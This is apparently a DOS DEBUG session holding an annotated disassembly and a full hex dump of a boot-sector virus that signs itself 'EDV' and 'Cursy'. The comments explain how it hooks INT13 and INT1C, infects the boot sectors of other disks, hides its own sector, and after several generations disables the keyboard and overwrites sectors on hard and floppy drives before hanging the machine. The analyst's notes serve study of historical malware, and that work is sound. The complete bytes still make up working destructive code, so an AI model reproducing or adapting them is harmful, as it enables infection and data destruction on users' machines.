f 0 f000 22
-l 7c00 0 0 2
-u 7c00 7e00
7C00 B800E8        MOV     AX,E800              ;Look for RAM in DS:0, for
7C03 33DB          XOR     BX,BX                ;  E800, D800, C800, A800...
7C05 8ED8          MOV     DS,AX                ;LookLoop:
7C07 C7078118      MOV     WORD PTR [BX],1881   ;  Is DS:BX in RAM?
7C0B 813F8118      CMP     WORD PTR [BX],1881   ;
7C0F 740D          JZ      7C1E                 ;  If so, go FoundRAM
7C11 2D0010        SUB     AX,1000              ;  Try next block down
7C14 3D00B8        CMP     AX,B800              ;  (skipping B800)
7C17 75EC          JNZ     7C05                 ;
7C19 B800A8        MOV     AX,A800              ;
7C1C EBE7          JMP     7C05                 ;  end loop
7C1E 8EC0          MOV     ES,AX                ;FoundRam:   ES := Target RAM
7C20 8EDB          MOV     DS,BX                ;            DS := 0000
7C22 BE007C        MOV     SI,7C00              ;  Move 0100 bytes of ourself
7C25 33FF          XOR     DI,DI                ;  up into RAM:0000
7C27 B90001        MOV     CX,0100              ;
7C2A FC            CLD                          ;
7C2B F3            REPZ                         ;  movemovemovemove
7C2C A5            MOVSW                        ;
7C2D B83300        MOV     AX,0033              ;  Transfer control to
7C30 06            PUSH    ES                   ;    the copy.
7C31 50            PUSH    AX                   ;
7C32 CB            RETF                         ;
7C33 8EDB          MOV     DS,BX                ;ToHere:  DS := 0000
7C35 C4064C00      LES     AX,[004C]            ;  Store INT13 vector.
7C39 2E            CS:                          ;
7C3A A30002        MOV     [0200],AX            ;
7C3D 2E            CS:                          ;
7C3E 8C060202      MOV     [0202],ES            ;
7C42 C7064C007300  MOV     WORD PTR [004C],0073 ;  Point it at NewINT13,
7C48 8C0E4E00      MOV     [004E],CS            ;    below.
7C4C C4065800      LES     AX,[0058]            ;  Store INT1C vector.
7C50 2E            CS:                          ;
7C51 A30402        MOV     [0204],AX            ;
7C54 2E            CS:                          ;
7C55 8C060602      MOV     [0206],ES            ;
7C59 8EC3          MOV     ES,BX                ;  Load the real boot sector
7C5B BB007C        MOV     BX,7C00              ;    from head 1, track/sec
7C5E B90827        MOV     CX,2708              ;    2708, into the usual
7C61 B601          MOV     DH,01                ;    place
7C63 B80102        MOV     AX,0201              ;
7C66 9C            PUSHF                        ;
7C67 2E            CS:                          ;
7C68 FF1E0002      CALL    FAR [0200]           ;  call real INT13
7C6C 7302          JNB     7C70                 ;
7C6E CD19          INT     19                   ;  INT19 if failed.
7C70 06            PUSH    ES                   ;
7C71 53            PUSH    BX                   ;
7C72 CB            RETF                         ;  Pass control to real boot
7C73 50            PUSH    AX                   ;NewINT13:
7C74 1E            PUSH    DS                   ;
7C75 06            PUSH    ES                   ;
7C76 53            PUSH    BX                   ;
7C77 51            PUSH    CX                   ;
7C78 52            PUSH    DX                   ;
7C79 80FC05        CMP     AH,05                ;  If Format Track,
7C7C 7462          JZ      7CE0                 ;    go ToBIOS
7C7E 80FC01        CMP     AH,01                ;  If Rest or ReadStatus
7C81 7E5D          JLE     7CE0                 ;    go ToBIOS
7C83 B90100        MOV     CX,0001              ;TryInfect:
7C86 B600          MOV     DH,00                ;  Read the boot sector from
7C88 8CC8          MOV     AX,CS                ;  the disk(ette) in question
7C8A 8EC0          MOV     ES,AX                ;  into a buffer at 0500.
7C8C 8ED8          MOV     DS,AX                ;
7C8E BB0005        MOV     BX,0500              ;
7C91 B80102        MOV     AX,0201              ;
7C94 9C            PUSHF                        ;
7C95 FF1E0002      CALL    FAR [0200]           ;  call real BIOS
7C99 7245          JB      7CE0                 ;  If failed, go DoMisc
7C9B 813EFE064556  CMP     WORD PTR [06FE],5645 ;  Check for EV signature.
7CA1 7540          JNZ     7CE3                 ;  If not there, go NotUs
7CA3 A0FD01        MOV     AL,[01FD]            ;  Compare OurFD to
7CA6 3A06FC06      CMP     AL,[06FC]            ;    TargetFC (should be FD??)
7CAA 7604          JBE     7CB0                 ;  If we are greater, and
7CAC 3CFF          CMP     AL,FF                ;    we are not FF, go BigUs
7CAE 755A          JNZ     7D0A                 ;
7CB0 5A            POP     DX                   ;SmallUs:
7CB1 59            POP     CX                   ;
7CB2 80FE00        CMP     DH,00                ;  If target is boot sector,
7CB5 7505          JNZ     7CBC                 ;    go BootOp
7CB7 83F901        CMP     CX,+01               ;
7CBA 741D          JZ      7CD9                 ;
7CBC 81F90827      CMP     CX,2708              ;  If target is not 2708,
7CC0 751C          JNZ     7CDE                 ;    go NormalOp
7CC2 80FE01        CMP     DH,01                ;  If head is not 01, go
7CC5 7517          JNZ     7CDE                 ;    NormalOp
7CC7 5B            POP     BX                   ;OurSectorOp:
7CC8 07            POP     ES                   ;
7CC9 1F            POP     DS                   ;
7CCA 58            POP     AX                   ;  Set carry (pretend the
7CCB 83C404        ADD     SP,+04               ;    operation failed)
7CCE 58            POP     AX                   ;
7CCF 0C01          OR      AL,01                ;
7CD1 50            PUSH    AX                   ;
7CD2 83EC04        SUB     SP,+04               ;
7CD5 B80001        MOV     AX,0100              ;
7CD8 CF            IRET                         ;  back to caller
7CD9 B601          MOV     DH,01                ;BootOp:
7CDB B90827        MOV     CX,2708              ;  Look at our sector instead
7CDE 51            PUSH    CX                   ;NormalOp:
7CDF 52            PUSH    DX                   ;  restore regs, on to bios
7CE0 EB41          JMP     7D23                 ;ToBios:  bridge ToBIOS2
7CE2 90            NOP                          ;
7CE3 FE0E0A02      DEC     BYTE PTR [020A]      ;NotUs:  Count down
7CE7 7D3A          JGE     7D23                 ;  If not zero yet, ToBIOS3
7CE9 C6060A0202    MOV     BYTE PTR [020A],02   ;  If time, set delay back to 2
7CEE B90827        MOV     CX,2708              ;  Write the boot sector into
7CF1 B601          MOV     DH,01                ;    Our Place on the disk
7CF3 B80103        MOV     AX,0301              ;
7CF6 9C            PUSHF                        ;
7CF7 FF1E0002      CALL    FAR [0200]           ;    via real BIOS
7CFB 7226          JB      7D23                 ;  if failed, ToBOIS3
7CFD B0FF          MOV     AL,FF                ;  NewFD := FF
7CFF FE06FD01      INC     BYTE PTR [01FD]      ;  Increment OurFD
7D03 803EFD0106    CMP     BYTE PTR [01FD],06   ;  If it's now six or bigger,
7D08 7D1C          JGE     7D26                 ;    go ZapIt.  Else continue
7D0A 8606FD01      XCHG    AL,[01FD]            ;BigUs:  Save NewFD
7D0E 50            PUSH    AX                   ;
7D0F B90100        MOV     CX,0001              ;  Write ourself into
7D12 B600          MOV     DH,00                ;    the victim's boot
7D14 33DB          XOR     BX,BX                ;    record.
7D16 B80103        MOV     AX,0301              ;
7D19 9C            PUSHF                        ;
7D1A FF1E0002      CALL    FAR [0200]           ;    via real BIOS
7D1E 58            POP     AX                   ;
7D1F 8606FD01      XCHG    AL,[01FD]            ;  Restore the real FD
7D23 EB60          JMP     7D85                 ;ToBIOS2: bridge ToBIOS3
7D25 90            NOP                          ;
7D26 C606FD0105    MOV     BYTE PTR [01FD],05   ;ZapIt:  Set OurFD to 5
7D2B B800F0        MOV     AX,F000              ;
7D2E 8EC0          MOV     ES,AX                ;  ES := F000
7D30 B002          MOV     AL,02                ;  Disable IRQ1, which
7D32 E621          OUT     21,AL                ;    is INT09, the keyboard.
7D34 33DB          XOR     BX,BX                ;  ES:BX := F000:0000
7D36 B280          MOV     DL,80                ;  point at the hard disk
7D38 B90100        MOV     CX,0001              ;NextDrive:  start at bottom
7D3B B603          MOV     DH,03                ;NextTrack:  head #3
7D3D B81103        MOV     AX,0311              ;NextHead:   write 011 sectors
7D40 9C            PUSHF                        ;
7D41 FF1E0002      CALL    FAR [0200]           ;  via real BIOS (ouch!)
7D45 80FC80        CMP     AH,80                ;  Did device timeout?
7D48 740B          JZ      7D55                 ;    If so, go TryNextDL
7D4A FECE          DEC     DH                   ;  Lower the head number
7D4C 7DEF          JGE     7D3D                 ;  If >=0, go NextHead
7D4E FEC5          INC     CH                   ;  Raise the track number
7D50 80FD02        CMP     CH,02                ;    If 0 or 1,
7D53 7CE6          JL      7D3B                 ;     go NextTrack
7D55 FEC2          INC     DL                   ;TryNextDL:  Raise the drive#
7D57 80FA82        CMP     DL,82                ;  If drive is now 82,
7D5A 7504          JNZ     7D60                 ;
7D5C B200          MOV     DL,00                ;    set drive to 00, and
7D5E EBD8          JMP     7D38                 ;    go NextDrive
7D60 80FA04        CMP     DL,04                ;  If drive is not 04,
7D63 75D3          JNZ     7D38                 ;    go NextDrive
7D65 BBC301        MOV     BX,01C3              ;
7D68 43            INC     BX                   ;  Add 05 to the bytes
7D69 800705        ADD     BYTE PTR [BX],05     ;    from 01C4 to the first
7D6C 803F24        CMP     BYTE PTR [BX],24     ;    1F (01E9?)
7D6F 75F7          JNZ     7D68                 ;
7D71 BAC401        MOV     DX,01C4              ;  Write them out via DOS.
7D74 B80009        MOV     AX,0900              ; ["That rings a
7D77 CD21          INT     21                   ;   bell,no ? from Cursy"]
7D79 BBC301        MOV     BX,01C3              ;  Regarble the message
7D7C 43            INC     BX                   ;
7D7D 802F05        SUB     BYTE PTR [BX],05     ;
7D80 803F1F        CMP     BYTE PTR [BX],1F     ;
7D83 75F7          JNZ     7D7C                 ;
7D85 33C0          XOR     AX,AX                ;ToBIOS3:
7D87 8ED8          MOV     DS,AX                ;
7D89 E621          OUT     21,AL                ;  Enable all IRQs.
7D8B C7065800A001  MOV     WORD PTR [0058],01A0 ;  Hook INT1C
7D91 8C0E5A00      MOV     [005A],CS            ;    (See NewINT1C below)
7D95 5A            POP     DX                   ;
7D96 59            POP     CX                   ;
7D97 5B            POP     BX                   ;
7D98 07            POP     ES                   ;
7D99 1F            POP     DS                   ;
7D9A 58            POP     AX                   ;
7D9B 2E            CS:                          ;
7D9C FF2E0002      JMP     FAR [0200]           ;  control to real BIOS
7DA0 50            PUSH    AX                   ;NewINT1C:
7DA1 53            PUSH    BX                   ;
7DA2 8CC8          MOV     AX,CS                ;  If DS>=(CS-0100),
7DA4 2D0001        SUB     AX,0100              ;    go MaybeHang.
7DA7 8CDB          MOV     BX,DS                ;
7DA9 3BD8          CMP     BX,AX                ;
7DAB 730D          JNB     7DBA                 ;
7DAD 8CC3          MOV     BX,ES                ;  If ES>=(CS-0100),
7DAF 3BD8          CMP     BX,AX                ;    go MaybeHang.
7DB1 7307          JNB     7DBA                 ;
7DB3 5B            POP     BX                   ;DontHang:
7DB4 58            POP     AX                   ;  Otherwise, OK...
7DB5 2E            CS:                          ;
7DB6 FF2E0402      JMP     FAR [0204]           ;  control to real INT1C
7DBA 055001        ADD     AX,0150              ;MaybeHang:
7DBD 3BD8          CMP     BX,AX                ;  If the high segreg is >=
7DBF 73F2          JNB     7DB3                 ;    CS+0050, go DontHang
7DC1 F4            HLT                          ;hang the machine...
7DC2 0000          ADD     [BX+SI],AL           ;
7DC4 0805          OR      [DI],AL              ;
7DC6 4F            DEC     DI                   ;
7DC7 63            DB      63                   ;
7DC8 5C            POP     SP                   ;
7DC9 6F            DB      6F                   ;
7DCA 1B6D64        SBB     BP,[DI+64]           ;
7DCD 69            DB      69                   ;
7DCE 62            DB      62                   ;
7DCF 6E            DB      6E                   ;
7DD0 1B5C1B        SBB     BX,[SI+1B]           ;
7DD3 5D            POP     BP                   ;
7DD4 60            DB      60                   ;
7DD5 67            DB      67                   ;
7DD6 67            DB      67                   ;
7DD7 27            DAA                          ;
7DD8 69            DB      69                   ;
7DD9 6A            DB      6A                   ;
7DDA 1B3A          SBB     DI,[BP+SI]           ;
7DDC 1B616D        SBB     SP,[BX+DI+6D]        ;
7DDF 6A            DB      6A                   ;
7DE0 68            DB      68                   ;
7DE1 1B3E706D      SBB     DI,[6D70]            ;
7DE5 6E            DB      6E                   ;
7DE6 7405          JZ      7DED                 ;
7DE8 081F          OR      [BX],BL              ;
7DEA 4D            DEC     BP                   ;
7DEB 53            PUSH    BX                   ;
7DEC 44            INC     SP                   ;
7DED 4F            DEC     DI                   ;
7DEE 53            PUSH    BX                   ;
7DEF 205665        AND     [BP+65],DL           ;
7DF2 7273          JB      7E67                 ;
7DF4 2E            CS:                          ;
7DF5 20452E        AND     [DI+2E],AL           ;
7DF8 44            INC     SP                   ;
7DF9 2E            CS:                          ;
7DFA 56            PUSH    SI                   ;
7DFB 2E            CS:                          ;
7DFC E7FF          OUT     FF,AX                ;
7DFE 45            INC     BP                   ;
7DFF 56            PUSH    SI                   ;
-d 7c00 7e00
7C00  B8 00 E8 33 DB 8E D8 C7-07 81 18 81 3F 81 18 74   ...3........?..t
7C10  0D 2D 00 10 3D 00 B8 75-EC B8 00 A8 EB E7 8E C0   .-..=..u........
7C20  8E DB BE 00 7C 33 FF B9-00 01 FC F3 A5 B8 33 00   ....|3........3.
7C30  06 50 CB 8E DB C4 06 4C-00 2E A3 00 02 2E 8C 06   .P.....L........
7C40  02 02 C7 06 4C 00 73 00-8C 0E 4E 00 C4 06 58 00   ....L.s...N...X.
7C50  2E A3 04 02 2E 8C 06 06-02 8E C3 BB 00 7C B9 08   .............|..
7C60  27 B6 01 B8 01 02 9C 2E-FF 1E 00 02 73 02 CD 19   '...........s...
7C70  06 53 CB 50 1E 06 53 51-52 80 FC 05 74 62 80 FC   .S.P..SQR...tb..
7C80  01 7E 5D B9 01 00 B6 00-8C C8 8E C0 8E D8 BB 00   .~].............
7C90  05 B8 01 02 9C FF 1E 00-02 72 45 81 3E FE 06 45   .........rE.>..E
7CA0  56 75 40 A0 FD 01 3A 06-FC 06 76 04 3C FF 75 5A   Vu@...:...v.<.uZ
7CB0  5A 59 80 FE 00 75 05 83-F9 01 74 1D 81 F9 08 27   ZY...u....t....'
7CC0  75 1C 80 FE 01 75 17 5B-07 1F 58 83 C4 04 58 0C   u....u.[..X...X.
7CD0  01 50 83 EC 04 B8 00 01-CF B6 01 B9 08 27 51 52   .P...........'QR
7CE0  EB 41 90 FE 0E 0A 02 7D-3A C6 06 0A 02 02 B9 08   .A.....}:.......
7CF0  27 B6 01 B8 01 03 9C FF-1E 00 02 72 26 B0 FF FE   '..........r&...
7D00  06 FD 01 80 3E FD 01 06-7D 1C 86 06 FD 01 50 B9   ....>...}.....P.
7D10  01 00 B6 00 33 DB B8 01-03 9C FF 1E 00 02 58 86   ....3.........X.
7D20  06 FD 01 EB 60 90 C6 06-FD 01 05 B8 00 F0 8E C0   ....`...........
7D30  B0 02 E6 21 33 DB B2 80-B9 01 00 B6 03 B8 11 03   ...!3...........
7D40  9C FF 1E 00 02 80 FC 80-74 0B FE CE 7D EF FE C5   ........t...}...
7D50  80 FD 02 7C E6 FE C2 80-FA 82 75 04 B2 00 EB D8   ...|......u.....
7D60  80 FA 04 75 D3 BB C3 01-43 80 07 05 80 3F 24 75   ...u....C....?$u
7D70  F7 BA C4 01 B8 00 09 CD-21 BB C3 01 43 80 2F 05   ........!...C./.
7D80  80 3F 1F 75 F7 33 C0 8E-D8 E6 21 C7 06 58 00 A0   .?.u.3....!..X..
7D90  01 8C 0E 5A 00 5A 59 5B-07 1F 58 2E FF 2E 00 02   ...Z.ZY[..X.....
7DA0  50 53 8C C8 2D 00 01 8C-DB 3B D8 73 0D 8C C3 3B   PS..-....;.s...;
7DB0  D8 73 07 5B 58 2E FF 2E-04 02 05 50 01 3B D8 73   .s.[X......P.;.s
7DC0  F2 F4 00 00 08 05 4F 63-5C 6F 1B 6D 64 69 62 6E   ......Oc\o.mdibn
7DD0  1B 5C 1B 5D 60 67 67 27-69 6A 1B 3A 1B 61 6D 6A   .\.]`gg'ij.:.amj
7DE0  68 1B 3E 70 6D 6E 74 05-08 1F 4D 53 44 4F 53 20   h.>pmnt...MSDOS
7DF0  56 65 72 73 2E 20 45 2E-44 2E 56 2E E7 FF 45 56   Vers. E.D.V...EV
-q
